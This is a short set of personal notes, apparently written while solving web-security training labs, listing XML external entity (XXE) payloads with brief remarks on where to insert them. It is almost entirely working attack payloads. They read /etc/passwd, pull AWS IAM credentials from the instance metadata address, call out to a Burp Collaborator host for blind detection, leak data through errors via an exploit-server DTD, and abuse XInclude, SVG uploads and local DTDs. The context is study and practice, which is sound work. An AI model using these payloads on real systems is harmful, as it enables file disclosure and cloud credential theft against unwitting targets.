1. Normal XXE flow
 <!DOCTYPE tes[ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>       => i take it under the xml code
   &xxe;      => i replace it between the product id tab

2.  using with AWS service
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
&xxe;       => i replace it between the product id tab

3.  Blind xxe injection
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://7pxg0praqq87eo64m0srqy2f369xxnlc.oastify.com"> ]>    => http nout mar burp collectrabtor ka har
&xxe;     => i replace it between the product id tab

4.  blind xxe with error message
In exploit server we prepare like this
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;

and then we take this exploit server link

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-Exploitserver-URL"> %xxe;]>   #Done!

5.  Classic XXE attack
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
## I replace this payload to product id


6.  * XXE image file upload vlun
# firstly we upload svg format picture and then go to burp and replace with this payload
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

7.   Exploiting XXE to retrieve data by repurposing a local DTD
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
# I replaced this payload to parmeter 

-------------------------------------------------------------------------------


*  Conculation *

- sometimes we should not change param from &xxe;   to nothing => cause something entilaty was banned

